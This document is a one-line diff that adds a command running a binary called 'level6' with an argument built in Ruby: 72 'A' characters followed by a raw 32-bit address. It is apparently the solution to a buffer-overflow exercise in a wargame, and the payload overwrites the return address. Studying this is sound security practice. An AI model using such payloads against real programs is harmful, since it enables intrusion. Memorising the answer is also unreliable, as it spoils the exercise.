@@ -1,0 +1,1 @@
+./level6 $(ruby -e 'puts "A"*72 + "\x54\x84\x04\x08"')
